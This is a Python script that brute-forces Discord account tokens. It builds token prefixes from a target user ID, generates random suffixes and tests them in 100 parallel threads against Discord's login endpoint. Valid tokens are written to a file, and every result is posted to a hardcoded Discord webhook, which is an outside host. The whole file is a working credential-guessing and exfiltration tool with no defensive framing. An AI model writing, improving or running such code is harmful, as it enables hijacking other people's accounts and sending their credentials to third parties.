
import base64
import os
import random
import string
import requests
from colorama import Fore
import concurrent.futures

id_to_token = base64.b64encode((input("ID TO TOKEN --> ")).encode("ascii"))
id_to_token = str(id_to_token)[2:-1]

webhook_url = "https://discord.com/api/webhooks/1051586192740716674/c1XXkMkggqKP2PVx21tgfhCe5eU7519dOd4aNohEna0A16ifyh7VpHgIz26zTJfjp1CB"
headers = {'Authorization': ''}

def send_to_webhook(content):
    requests.post(webhook_url, json={"content": content})

def check_token(token):
    headers['Authorization'] = token
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    if login.status_code == 200:
        send_to_webhook(Fore.GREEN + '[+] VALID' + ' ' + token)
        with open('hit.txt', "a+") as f:
            f.write(f'{token}\n')
    else:
        send_to_webhook(Fore.RED + '[-] INVALID' + ' ' + token)

def generate_tokens():
    while True:
        token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=2)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        yield token

tokens = generate_tokens()

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(10000):
        executor.submit(check_token, next(tokens))
